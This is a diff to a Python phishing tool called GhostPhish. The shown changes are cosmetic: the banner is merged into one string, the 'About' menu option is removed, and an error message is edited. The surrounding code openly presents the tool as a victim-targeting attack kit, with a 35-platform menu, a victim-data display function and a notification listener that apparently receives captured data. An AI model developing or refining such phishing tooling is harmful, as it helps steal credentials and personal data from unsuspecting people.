@@ -56,18 +56,19 @@ def fmt_entry(num, name):
     return colored + " " * padding
 
 def print_banner():
+    # دمج كل شيء في نص واحد بدون أسطر فارغة زائدة
     banner = f"""{ORANGE}
    ______              __  ____  __    _     __
   / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
  / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
 / /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
 \____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
-{RESET}"""
+{RESET}
+{WHITE}General : 1.0{RESET}
+{WHITE}[–] Tool Created by htr-tech (tahmid.rayat){RESET}
+{WHITE}[::] Select An Attack For Your Victim [::]{RESET}
+{ORANGE}غافل الغرباء{RESET}"""
     print(banner)
-    print(WHITE + "General : 1.0" + RESET)
-    print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
-    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
-    print(ORANGE + "غافل الغراب" + RESET)
 
 def print_menu():
     for i in range(1, 11):
@@ -79,7 +80,7 @@ def print_menu():
     print(fmt_entry(31, PLATFORMS[31]) + fmt_entry(32, PLATFORMS[32]) + fmt_entry(33, PLATFORMS[33]))
     print(fmt_entry(34, PLATFORMS[34]) + fmt_entry(35, PLATFORMS[35]))
 
-    print(f"{RED}[{WHITE}99{RED}]{RESET} {WHITE}About{RESET}    {RED}[{WHITE}00{RED}]{RESET} {WHITE}Exit{RESET}")
+    print(f"{RED}[{WHITE}00{RED}]{RESET} {WHITE}Exit{RESET}")
     print(WHITE + "[–] Select an option : " + RESET, end="")
 
 def display_victim_data(message):
@@ -119,7 +120,7 @@ def main():
     secret = load_or_create_secret()
     clear_screen()
     print_banner()
-    # حذفت \n عشان تختفي المسافة العمودية الزائدة
+    # المفتاح السري ملتصق تماماً بالسطر السابق بدون أي مسافة عمودية
     print(f"{WHITE}🔑 مفتاحك السري: {ORANGE}{secret}{RESET}")
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
@@ -131,15 +132,6 @@ def main():
         if choice == "00" or choice == "0":
             print(f"{WHITE}إيقاف الأداة...{RESET}")
             sys.exit(0)
-
-        if choice == "99":
-            clear_screen()
-            print_banner()
-            print(f"{WHITE}هذه أداة GhostPhish – إصدار 1.0{RESET}")
-            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
-            clear_screen()
-            print_banner()
-            continue
 
         if choice.isdigit():
             num = int(choice)
@@ -166,7 +158,7 @@ def main():
             else:
                 clear_screen()
                 print_banner()
-                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 99/00){RESET}")
+                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 00){RESET}")
                 input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                 clear_screen()
                 print_banner()
